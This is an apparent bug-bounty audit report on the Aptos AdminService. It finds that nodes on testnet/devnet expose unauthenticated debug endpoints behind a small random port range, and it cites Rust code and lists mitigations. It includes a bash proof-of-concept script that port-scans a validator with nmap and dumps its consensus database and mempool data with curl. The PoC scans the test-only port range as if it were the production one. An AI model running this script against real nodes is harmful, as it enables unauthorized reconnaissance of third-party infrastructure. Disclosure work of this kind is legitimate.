# Audit Report

## Title
Insufficient Port Randomization Range in AdminService Exposes Sensitive Debugging Endpoints on Testnet/Devnet

## Summary
The `randomize_ports()` function in AdminServiceConfig uses an insufficient port range (20,000 ports in test mode, ~28,000 ports in production mode) that can be trivially port-scanned by attackers. On testnet/devnet deployments where the AdminService is enabled by default without authentication, this allows attackers to discover and access sensitive debugging endpoints that expose internal node state. [1](#0-0) 

## Finding Description
The `randomize_ports()` function delegates to `utils::get_available_port()`, which has two operating modes:

1. **Test mode (nextest)**: Allocates from a pre-shuffled range of 10000-30000 (20,000 ports) [2](#0-1) 

2. **Production mode**: Uses OS-assigned ephemeral ports (typically 32768-60999 on Linux, ~28,000 ports) [3](#0-2) 

The AdminService binds to `0.0.0.0` (all network interfaces) by default: [4](#0-3) 

On testnet/devnet, the AdminService is auto-enabled WITHOUT authentication requirements: [5](#0-4) 

The service exposes sensitive endpoints including consensus database dumps, quorum store information, mempool state, CPU profiling, and thread dumps: [6](#0-5) 

**Attack Path:**
1. Attacker identifies testnet/devnet validator node IP address
2. Attacker performs port scan of 20,000-28,000 ports (completes in 1-2 minutes with modern tools like nmap/masscan)
3. Attacker identifies AdminService port by testing discovered open ports
4. Attacker accesses debugging endpoints without authentication (testnet/devnet has empty `authentication_configs` by default)
5. Attacker extracts sensitive internal state: consensus DB, quorum store DB, mempool parking lot addresses, profiling data

## Impact Explanation
This qualifies as **Low Severity** per Aptos bug bounty criteria - specifically "Minor information leaks". The exposed information includes:
- Internal consensus database state
- Quorum store database contents
- Block information and transaction details
- Mempool parking lot addresses
- CPU profiling and thread dump data
- Memory allocation statistics

While this information disclosure does not directly lead to fund theft or consensus violations, it provides valuable reconnaissance data that could aid in crafting more sophisticated attacks or understanding node internals for other exploit attempts.

The issue only affects testnet/devnet deployments (mainnet requires authentication), limiting the severity to information disclosure rather than direct financial impact.

## Likelihood Explanation
**High Likelihood** - The attack is trivial to execute:
- Port scanning 20,000-28,000 ports takes 1-2 minutes with readily available tools
- No authentication is required on testnet/devnet by default
- AdminService is auto-enabled on testnet/devnet
- Service binds to all network interfaces (0.0.0.0), making it accessible from any network route to the node

The only requirement is network access to the target node's IP address, which is publicly available for testnet/devnet validators.

## Recommendation
Implement one or more of the following mitigations:

1. **Require authentication on all networks** (Recommended):
   - Remove the mainnet-only authentication check in the sanitizer
   - Require `authentication_configs` to be non-empty on all chains when AdminService is enabled

2. **Increase port randomization range**:
   - Change `UNIQUE_PORT_RANGE` from `10000..30000` to use the full 16-bit range minus well-known ports (e.g., `10000..65535`)
   - This increases the range to 55,000+ ports, making exhaustive scanning more time-consuming

3. **Bind to localhost by default**:
   - Change default address from `"0.0.0.0"` to `"127.0.0.1"`
   - Require operators to explicitly configure external binding and use SSH tunneling for remote access

4. **Disable by default on all networks**:
   - Remove auto-enable logic for testnet/devnet
   - Require explicit opt-in for debugging endpoints

## Proof of Concept
```bash
#!/bin/bash
# Scan testnet validator node for AdminService
TARGET_IP="<testnet-validator-ip>"

# Step 1: Port scan the randomization range
echo "[*] Scanning ports 10000-30000..."
nmap -p 10000-30000 --open -T4 $TARGET_IP -oG scan_results.txt

# Step 2: Test discovered ports for AdminService endpoints
for port in $(grep -oP '\d+/open' scan_results.txt | cut -d'/' -f1); do
    echo "[*] Testing port $port..."
    response=$(curl -s "http://$TARGET_IP:$port/debug/consensus/consensusdb" 2>/dev/null)
    if [ ! -z "$response" ]; then
        echo "[+] AdminService found on port $port!"
        echo "[+] Dumping consensus DB..."
        curl "http://$TARGET_IP:$port/debug/consensus/consensusdb"
        echo "[+] Dumping mempool parking lot..."
        curl "http://$TARGET_IP:$port/debug/mempool/parking-lot/addresses"
        break
    fi
done
```

## Notes
This vulnerability relies on **security through obscurity** (port randomization) as the sole protection mechanism on testnet/devnet deployments. The port range is too small to provide meaningful protection against determined attackers with modern scanning tools. The fundamental issue is the lack of authentication requirements on non-mainnet chains combined with binding to all network interfaces by default.

### Citations

**File:** config/src/config/admin_service_config.rs (L45-45)
```rust
            address: "0.0.0.0".to_string(),
```

**File:** config/src/config/admin_service_config.rs (L54-56)
```rust
    pub fn randomize_ports(&mut self) {
        self.port = utils::get_available_port();
    }
```

**File:** config/src/config/admin_service_config.rs (L67-77)
```rust
        if node_config.admin_service.enabled == Some(true) {
            if let Some(chain_id) = chain_id {
                if chain_id.is_mainnet()
                    && node_config.admin_service.authentication_configs.is_empty()
                {
                    return Err(Error::ConfigSanitizerFailed(
                        sanitizer_name,
                        "Must enable authentication for AdminService on mainnet.".into(),
                    ));
                }
            }
```

**File:** config/src/utils.rs (L26-26)
```rust
const UNIQUE_PORT_RANGE: Range<u16> = 10000..30000;
```

**File:** config/src/utils.rs (L60-66)
```rust
pub fn get_available_port() -> u16 {
    if NEXTEST_RUN_ID.is_some() {
        get_unique_port()
    } else {
        get_random_port()
    }
}
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L183-243)
```rust
        match (req.method().clone(), req.uri().path()) {
            #[cfg(target_os = "linux")]
            (hyper::Method::GET, "/profilez") => handle_cpu_profiling_request(req).await,
            #[cfg(target_os = "linux")]
            (hyper::Method::GET, "/threadz") => handle_thread_dump_request(req).await,
            #[cfg(unix)]
            (hyper::Method::GET, "/malloc/stats") => {
                malloc::handle_malloc_stats_request(context.config.malloc_stats_max_len)
            },
            #[cfg(unix)]
            (hyper::Method::GET, "/malloc/dump_profile") => malloc::handle_dump_profile_request(),
            (hyper::Method::GET, "/debug/consensus/consensusdb") => {
                let consensus_db = context.consensus_db.read().clone();
                if let Some(consensus_db) = consensus_db {
                    consensus::handle_dump_consensus_db_request(req, consensus_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Consensus db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/consensus/quorumstoredb") => {
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(quorum_store_db) = quorum_store_db {
                    consensus::handle_dump_quorum_store_db_request(req, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Quorum store db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/consensus/block") => {
                let consensus_db = context.consensus_db.read().clone();
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(consensus_db) = consensus_db
                    && let Some(quorum_store_db) = quorum_store_db
                {
                    consensus::handle_dump_block_request(req, consensus_db, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Consensus db and/or quorum store db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/mempool/parking-lot/addresses") => {
                let mempool_client_sender = context.mempool_client_sender.read().clone();
                if let Some(mempool_client_sender) = mempool_client_sender {
                    mempool::mempool_handle_parking_lot_address_request(req, mempool_client_sender)
                        .await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Mempool parking lot is not available.",
                    ))
                }
            },
            _ => Ok(reply_with_status(StatusCode::NOT_FOUND, "Not found.")),
        }
```
